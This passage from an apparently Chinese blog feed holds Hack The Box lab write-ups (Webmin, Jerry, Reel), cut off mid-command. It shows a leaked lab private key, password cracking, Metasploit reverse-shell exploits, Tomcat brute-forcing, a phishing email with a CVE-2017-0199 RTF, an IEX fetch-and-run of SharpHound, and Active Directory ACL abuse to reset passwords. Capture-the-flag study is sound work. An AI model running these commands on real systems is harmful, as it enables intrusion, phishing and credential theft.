class="line">UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY</span><br><span class="line">Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK</span><br><span class="line">t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS</span><br><span class="line">5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke</span><br><span class="line">P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6</span><br><span class="line">jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge</span><br><span class="line">SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i</span><br><span class="line">l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X</span><br><span class="line">0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p</span><br><span class="line">S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR</span><br><span class="line">hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+</span><br><span class="line">Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V</span><br><span class="line">XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD</span><br><span class="line">b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi</span><br><span class="line">WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh</span><br><span class="line">KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm</span><br><span class="line">npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ</span><br><span class="line">VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W</span><br><span class="line">X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>我们将其下载到本机，并使用ssh2john.py将其哈希导出<br><img src="https://img-blog.csdnimg.cn/66c4d071bea24d2bb4891441037f3a8d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后使用john进行破解得到密码，得到密码computer2008，登录到Matt账户<br><img src="https://img-blog.csdnimg.cn/40e53a09c8a549a19313e7fb22d13443.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>我们访问10000端口发现是个webmin应用程序，在EDB发现存在RCE漏洞并在MSF中集成<br><img src="https://img-blog.csdnimg.cn/83ea6c04c24c457e896f109ef6a6cfbf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ae16ec96fd1d44ceac7112af658419af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们直接使用第二个并填写好参数后，得到root权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use 2</span><br><span class="line">[*] Using configured payload cmd/unix/reverse_perl</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD                    yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME                    yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Webmin &lt;= 1.910</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> password computer2008</span><br><span class="line">password =&gt; computer2008</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> rhosts 10.10.10.160</span><br><span class="line">rhosts =&gt; 10.10.10.160</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; <span class="built_in">set</span> ssl <span class="literal">true</span></span><br><span class="line">[!] Changing the SSL option<span class="string">&#x27;s value may require changing RPORT!</span></span><br><span class="line"><span class="string">ssl =&gt; true</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; show options </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Module options (exploit/linux/http/webmin_packageup_rce):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name       Current Setting  Required  Description</span></span><br><span class="line"><span class="string">   ----       ---------------  --------  -----------</span></span><br><span class="line"><span class="string">   PASSWORD   computer2008     yes       Webmin Password</span></span><br><span class="line"><span class="string">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span></span><br><span class="line"><span class="string">   RHOSTS     10.10.10.160     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span></span><br><span class="line"><span class="string">   RPORT      10000            yes       The target port (TCP)</span></span><br><span class="line"><span class="string">   SSL        true             no        Negotiate SSL/TLS for outgoing connections</span></span><br><span class="line"><span class="string">   TARGETURI  /                yes       Base path for Webmin application</span></span><br><span class="line"><span class="string">   USERNAME                    yes       Webmin Username</span></span><br><span class="line"><span class="string">   VHOST                       no        HTTP server virtual host</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Payload options (cmd/unix/reverse_perl):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Name   Current Setting  Required  Description</span></span><br><span class="line"><span class="string">   ----   ---------------  --------  -----------</span></span><br><span class="line"><span class="string">   LHOST                   yes       The listen address (an interface may be specified)</span></span><br><span class="line"><span class="string">   LPORT  4444             yes       The listen port</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Exploit target:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Id  Name</span></span><br><span class="line"><span class="string">   --  ----</span></span><br><span class="line"><span class="string">   0   Webmin &lt;= 1.910</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set username Matt</span></span><br><span class="line"><span class="string">username =&gt; Matt</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set lhost 10.10.14.9</span></span><br><span class="line"><span class="string">lhost =&gt; 10.10.14.9</span></span><br><span class="line"><span class="string">msf6 exploit(linux/http/webmin_packageup_rce) &gt; set ssl true</span></span><br><span class="line"><span class="string">[!] Changing the SSL option&#x27;</span>s value may require changing RPORT!</span><br><span class="line">ssl =&gt; <span class="literal">true</span></span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/6427bab560c04677b571daeed8ba6947.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>未授权访问漏洞</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Jerry</title>
    <url>/2021/12/24/Jerry/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/d5f1dc82530e485e91e914d59c62f9ff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>我们可以看到，目标主机只开放了8080端口，而且版本还是<code>7.0.88</code>的<br><img src="https://img-blog.csdnimg.cn/12b2a2ded3544b248ce0ae24e4c30139.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>我们立马登录tomcat页面，并且尝试账户和密码都是admin，看看能不能登录成功，结果是失败的。<br><img src="https://img-blog.csdnimg.cn/14569a31b1e04d76855654582e15e833.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a1c59a404d30477d9434d5ca81214227.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们下载<code>seclists</code>这个工具，对tomcat的默认用户名和密码进行暴力破解<br><img src="https://img-blog.csdnimg.cn/4573275f27314e41997be90a187c528b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们使用hydra工具对账号密码进行破解，发现账号是tomcat，密码是s3cret</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http://10.10.10.95:8080/manager/html</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2e489a5e1395436f87bbc2c1c05db04b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h3 id="MSF获取权限"><a href="#MSF获取权限" class="headerlink" title="MSF获取权限"></a>MSF获取权限</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search tomcat_mgr</span><br><span class="line">use exploit/multi/http/tomcat_upload</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 10.10.10.95</span><br><span class="line"><span class="built_in">set</span> lhost 10.10.14.11</span><br><span class="line"><span class="built_in">set</span> httpusername tomcat</span><br><span class="line"><span class="built_in">set</span> httppassword s3cret</span><br><span class="line"><span class="built_in">set</span> rport 8080</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/405b1654a30e4fd8b5ff405938d24a51.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们获取一个shell，发现已经是最高权限了<br><img src="https://img-blog.csdnimg.cn/efd9843d30e5431cbe6ae1408fbcb011.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们就可以查看到flag值了<br><img src="https://img-blog.csdnimg.cn/89ecac8618f24fdf9edd6cf96a419036.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h3 id="NC反弹shell"><a href="#NC反弹shell" class="headerlink" title="NC反弹shell"></a>NC反弹shell</h3><p>首先我们先准备一个木马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.11 lport=1234 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/c4abdde92c484b46ac8782a2c62da4fa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用账号密码登录进部署页面，并将生成的木马部署进tomcat服务器上<br><img src="https://img-blog.csdnimg.cn/9dd05049c33f45cf971a5f70a9a6d2e8.png" alt="在这里插入图片描述"><br>然后我们启动nc进行监听，并且在浏览器上浏览我们刚刚上传的war包，反弹shell成功。<br><img src="https://img-blog.csdnimg.cn/fbcd897e89c149549ead8a54352163ae.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/488c679d14e64be28972f71dab63504a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>中间件</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Reel</title>
    <url>/2021/12/24/Reel/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host discovery disabled (-Pn). All addresses will be marked <span class="string">&#x27;up&#x27;</span> and scan <span class="built_in">times</span> will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-14 05:18 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.77</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 9997 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)</span><br><span class="line">|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)</span><br><span class="line">|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)</span><br><span class="line">25/tcp open  smtp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   Hello: </span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     EHLO Invalid domain address.</span><br><span class="line">|   Help: </span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">|   NULL: </span><br><span class="line">|_    220 Mail Service ready</span><br><span class="line">| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, </span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY </span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port25-TCP:V=7.91%I=7%D=11/14%Time=6190E2F5%P=x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,18,<span class="string">&quot;220\x20Mail\x20Service\x20ready\r\n&quot;</span>)%r(Hello,3A,<span class="string">&quot;220\x20Mail\x20</span></span><br><span class="line"><span class="string">SF:Service\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n&quot;</span>)</span><br><span class="line">SF:%r(Help,54,<span class="string">&quot;220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20E</span></span><br><span class="line"><span class="string">SF:HLO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n</span></span><br><span class="line"><span class="string">SF:&quot;</span>);</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</span><br><span class="line">No OS matches <span class="keyword">for</span> host</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 22/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   301.22 ms 10.10.14.1</span><br><span class="line">2   301.21 ms 10.10.10.77</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 185.69 seconds</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>发现开放了21端口，可以匿名登录，并且在documents目录下发现了两个docx文件，我们将其下载下来并使用exiftool查看内容如下<img src="https://img-blog.csdnimg.cn/15c476e67c4941c6b76d60c03fdede70.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>readme.txt文件告诉我们有人正在等待 .rtf 文件并将打开它们进行审查，因为考虑到机器上正在运行 SMTP 服务，这可能是我们的目标，具有网络钓鱼攻击。<br><img src="https://img-blog.csdnimg.cn/c858f787033a4c5b8a8cbbe73d598b86.png" alt="在这里插入图片描述"></p>
<p>查阅官方文档发现，AppLocker可以阻止可执行文件和脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AppLocker procedure to be documented - <span class="built_in">hash</span> rules <span class="keyword">for</span> exe, msi and scripts  (ps1,vbs,cmd,bat,js) are <span class="keyword">in</span> effect.</span><br></pre></td></tr></table></figure>

<p>我们发现Windows Event Forwarding.docx这个文件中存在一个邮箱地址<code>nico@megabank.com</code><br><img src="https://img-blog.csdnimg.cn/14102687e160477884fd2f3e6c8910a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>根据刚刚readme.txt的文件内容，我们可以尝试将rtf文件发送到这个地址上，我们从application字段中发现我们可以使用word文档的方式进行创建。并且我们在网上搜索看到，关于rtf文件漏洞利用是已经披露的漏洞编号<code>CVE-2017-0199</code>，此漏洞允许创建恶意 rtf 文档，在打开文档时启动 HTA（超文本应用程序)有效负载，Github 上有一个用于制作利用此漏洞的恶意文档的 Python 工具包，但也有一个 Metasploit 模块，我仍然将使用 Python 脚本。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先我们创建一个hta的载荷<br><img src="https://img-blog.csdnimg.cn/b6c156c3e5e84eebb3b7207a29673574.png" alt="在这里插入图片描述"><br>本地开启http服务器<br><img src="https://img-blog.csdnimg.cn/ebf7fdbfa46043bb84f2a0e1c331c6c7.png" alt="在这里插入图片描述"></p>
<p>然后利用这个hta脚本，创建rtf文件<br><img src="https://img-blog.csdnimg.cn/bf21d9b792054d399fe94052c21c3129.png" alt="在这里插入图片描述"><br>最后发送钓鱼邮件进行获取权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u Test -m <span class="string">&quot;Hey, take a look at this new format procedure&quot;</span> -a document.rtf -s 10.10.10.77 -v</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/f64aa5ef2a984a4e92fd8dfed197da16.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发送钓鱼邮件并开启监听，我们得到了nico账户的用户权限<br><img src="https://img-blog.csdnimg.cn/6965f266fe7341beb4fd71506ff9335b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权到TOM权限"><a href="#提权到TOM权限" class="headerlink" title="提权到TOM权限"></a>提权到TOM权限</h2><p>我们从Nico账户的桌面上看到一个cred.xml文件，文件内容包含了password字段内容<br><img src="https://img-blog.csdnimg.cn/b971324dcaa14613a8d91aa6b4997923.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>PowerShell 有一个称为 PSCredential 的对象，它提供了一种存储用户名、密码和凭据的方法。还有两个函数Import-CliXml和Export-CliXml，用于将这些凭据保存到文件中并从文件中恢复它们。该文件是Export-CliXml，我们发现Tom的密码是<code>1ts-mag1c!!!</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\nico\Desktop&gt;powershell -c <span class="string">&quot;<span class="variable">$cred</span>=Import-CliXml -Path cred.xml;<span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br><span class="line">powershell -c <span class="string">&quot;<span class="variable">$cred</span>=Import-CliXml -Path cred.xml;<span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br><span class="line"></span><br><span class="line">UserName       : Tom</span><br><span class="line">Password       : 1ts-mag1c!!!</span><br><span class="line">SecurePassword : System.Security.SecureString</span><br><span class="line">Domain         : HTB</span><br></pre></td></tr></table></figure>

<p>因为目标主机开放了22端口，因此我们可以连接主机的远程服务<br><img src="https://img-blog.csdnimg.cn/c0ef87585054476281e5aa1595fa284e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在tom的桌面的AD audit文件夹下发现了一个有趣的文件内容，还有一个BloodHound文件夹<br><img src="https://img-blog.csdnimg.cn/67be2e3fd4494a14bc46cd3a6af8eb45.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e9b9cfa8736d42788e6f32b6d3b628fa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>经过查阅文章发现，bloodhound通过csv文件形式保存文件的，都是2.0版本以前的了，那么我们现在有两个选择，一个是在目标主机上安装旧版本的bloodhound，二是将收集到的数据上传到我们攻击机上进行分析，我选择的是第二种方式。</p>
<p>首先我们将目标的脚本加载到内存中，绕过powershell的策略限制。收集到的信息保存在当前目录的一个压缩包中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).downloadString(<span class="string">&#x27;http://10.10.14.7/sharphound/SharpHound.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/44243984d10a4293a08aebd5b9748298.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>为了传输方便，我们在本地开启smb服务<br><img src="https://img-blog.csdnimg.cn/65746cbe84ba4b048fb124b74a55a741.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在攻击机上开启bloodhound后，将压缩包拖进去进行分析，点击<code>Shortest Paths to High Value Targets</code>。为了方便筛选，我们选择tom到admin的提权路径和nico到admin的路径进行分析<br><img src="https://img-blog.csdnimg.cn/29bd464348754983b4412b33ca42a996.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/399172cccb7243948e1b64abf136697b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我知道 claire 对 Backup_Admins 组具有 WriteDacl 权限。我可以用它把她加到群里，但是事先我们先得连接到claire这个用户上。</p>
<h2 id="提权到Administrator"><a href="#提权到Administrator" class="headerlink" title="提权到Administrator"></a>提权到Administrator</h2><p>首先，我们将自己设置为 claire 帐户的所有者，以便我们可以更改她的属性；然后我们更改 claire AD 对象的访问控制列表 (ACL) 以授予我们自己 (Tom) 重置 claire 密码的权限；然后我们为该帐户选择一个新密码并将其转换为 SecureString 格式，这就是 PowerShell 用于密码的格式；我们可以使用我们选择的一个更改 claire 的密码；为了将用户添加到组，我们必须提供有效的用户凭据，因此我们声明一个 PSCredential 对象来包含 claire 的用户名和密码，因为她是对 Backup_Admins 组具有写访问权限的人；最后我们使用它来将自己添加到 Backup_Admins 组</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; import-module .\PowerView.ps1</span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt;  Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                         </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Add-ObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword  </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; <span class="variable">$password</span>= ConvertTo-SecureString <span class="string">&#x27;Password_123!&#x27;</span> -AsPlainText -Force              </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Set-DomainUserPassword -Identity claire -AccountPassword <span class="variable">$password</span>                 </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; <span class="variable">$creds</span> = New-Object System.Management.Automation.PSCredential(<span class="string">&#x27;HTB\claire&#x27;</span>,<span class="variable">$passwor</span></span><br><span class="line">d)                                                                                                                              </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; 